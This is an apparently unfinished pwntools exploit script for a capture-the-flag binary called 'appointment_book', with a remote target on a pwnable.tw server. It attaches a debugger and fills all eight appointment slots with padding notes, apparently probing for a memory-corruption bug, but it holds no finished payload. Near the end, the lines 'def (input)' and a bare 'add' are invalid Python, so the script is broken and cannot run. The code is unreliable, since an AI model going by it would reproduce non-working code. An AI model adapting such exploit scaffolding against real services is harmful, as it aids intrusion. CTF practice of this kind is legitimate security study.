#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("appointment_book")

local = True 
if local:
    p = process("./appointment_book")
    gdb.attach(p,'''b*fgets+39\nc''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./appointment_book', checksec=False)

def list_appointments():
    p.sendlineafter(b"ce:", b"1")

def add(idx, time, data):
    p.sendlineafter(b"ce:", b"2")
    p.sendlineafter(b"t (0-7):", str(idx))
    p.sendlineafter(b"HH:MM:SS):", time)
    p.sendlineafter(b" notes...):", data)

add(0, b"2023-01-04 00:00:00", b"a"*60)
add(1, b"2023-01-04 00:00:00", b"a"*60)
add(2, b"2023-01-04 00:00:00", b"a"*60)
add(3, b"2023-01-04 00:00:00", b"a"*60)
add(4, b"2023-01-04 00:00:00", b"a"*60)
add(5, b"2023-01-04 00:00:00", b"a"*60)
add(6, b"2023-01-04 00:00:00", b"a"*60)
add(7, b"2023-01-04 00:00:00", b"a"*60)


def (input)
add


p.interactive()